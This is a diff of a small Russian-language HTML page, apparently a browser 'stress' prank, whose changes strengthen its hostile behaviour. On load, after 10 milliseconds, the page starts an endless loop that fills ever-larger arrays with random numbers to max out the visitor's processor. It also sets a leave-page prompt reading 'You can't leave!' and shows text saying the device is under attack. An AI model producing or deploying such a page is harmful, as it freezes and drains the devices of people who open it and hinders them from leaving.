@@ -1,35 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Stress Test</title>
+  <title>Максимальная Нагрузка</title>
   <script>
     window.onload = function() {
-      // Предотвращаем закрытие страницы
+      // Предотвращаем выход со страницы
       window.onbeforeunload = function() {
-        return "Ты точно хочешь уйти?";
+        return "⚠️ Нельзя выйти!";
       };
 
-      // Максимальная нагрузка на процессор
+      // Супер нагрузка на процессор
       setTimeout(() => {
         while (true) {
-          // Заполняем массив случайными числами бесконечно
           let arr = [];
-          for (let i = 0; i < 10000; i++) {
-            arr.push(Math.random());
+          for (let i = 0; i < 50000; i++) {
+            arr.push(Math.random() * Math.random() * Math.random());
           }
-          console.log("⚙️ Нагрузка продолжается...");
+          console.log("💥 Грузим процессор...");
         }
-      }, 1000); // Через 1 секунду после загрузки
+      }, 10); // Почти мгновенно
     };
   </script>
 </head>
 <body>
-  <h1>Телефон под нагрузкой</h1>
-  <p>Эта страница специально создана для нагрузки. Закрыть её будет непросто.</p>
-</body>
-</html>
-
-    <button onclick="startTest()">Начать тест</button>
+  <h1 style="text-align: center; margin-top: 100px;">⛔ Нагрузка началась...</h1>
+  <p style="text-align: center;">⚙️ Ваше устройство под полной атакой нагрузки.</p>
 </body>
 </html>
